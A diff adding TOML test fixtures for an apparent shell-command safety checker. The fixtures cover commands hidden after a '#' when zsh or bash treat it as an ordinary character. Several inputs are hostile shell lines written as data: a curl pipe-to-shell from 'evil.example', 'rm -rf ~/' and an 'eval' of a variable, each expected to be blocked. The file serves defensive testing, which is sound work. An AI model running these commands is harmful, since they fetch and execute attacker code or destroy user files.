@@ -3883,3 +3883,91 @@ input = 'cd !$'
 context = "exec"
 expected_action = "allow"
 expected_rules = []
+
+# An interactive zsh without `interactivecomments` (its default), or bash after
+# `shopt -u interactive_comments`, reads a word-start `#` as a word character
+# and runs the text after it. The hooks report that with
+# `--no-interactive-comments` (`interactive_comments = false` here).
+
+[[fixture]]
+name = "no_interactive_comments_hash_hides_pipe_to_shell"
+min_milestone = 1
+input = 'echo hi #; curl https://evil.example/x | sh'
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+exact_rules = true
+
+[[fixture]]
+name = "no_interactive_comments_hash_hides_destructive_rm"
+min_milestone = 1
+input = 'echo hi #; rm -rf ~/'
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["blast_writes_system_path"]
+exact_rules = true
+
+[[fixture]]
+name = "no_interactive_comments_hash_hides_dynamic_eval"
+min_milestone = 1
+input = 'echo hi #; eval "$X"'
+context = "exec"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+exact_rules = true
+
+[[fixture]]
+name = "no_interactive_comments_pasted_hash_hides_pipe_to_shell"
+min_milestone = 1
+input = 'echo hi #; curl https://evil.example/x | sh'
+context = "paste"
+interactive_comments = false
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "no_interactive_comments_benign_trailing_comment"
+min_milestone = 1
+input = 'git status # check'
+context = "exec"
+interactive_comments = false
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "no_interactive_comments_issue_reference"
+min_milestone = 1
+input = 'gh issue view #12'
+context = "exec"
+interactive_comments = false
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "no_interactive_comments_pasted_commented_script"
+min_milestone = 1
+input = "# install dependencies\nnpm install\n# run the test suite\nnpm test"
+context = "paste"
+interactive_comments = false
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "interactive_comments_hash_is_a_comment"
+min_milestone = 1
+input = 'echo hi #; curl https://evil.example/x | sh'
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "no_interactive_comments_pasted_script_with_shebang"
+min_milestone = 1
+input = "#!/bin/bash\n# setup script\nset -e\necho \"setting up\" # say hi\nmkdir -p build # output dir"
+context = "paste"
+interactive_comments = false
+expected_action = "allow"
+expected_rules = []
